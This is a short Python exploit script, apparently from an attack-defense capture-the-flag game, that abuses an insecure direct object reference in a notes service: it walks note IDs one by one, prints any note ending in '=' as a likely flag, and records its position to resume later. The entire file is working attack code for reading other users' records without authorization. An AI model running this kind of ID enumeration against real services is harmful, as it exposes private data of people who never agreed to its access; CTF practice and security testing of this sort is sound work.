from service1_common import view_note, team_id


def exploit():
    try:
        with open(f'service1-team{team_id}-idor_last_flag.txt', 'r') as f:
            note_id = int(f.read())
    except FileNotFoundError:
        note_id = 1

    while True:
        note = view_note(note_id)
        if not note:
            with open(f'service1-team{team_id}-idor_last_flag.txt', 'w') as f:
                f.write(str(note_id))

            return

        _, note_content = note
        if note_content.strip().endswith('='):
            print(note_content)

        note_id += 1


if __name__ == '__main__':
    exploit()
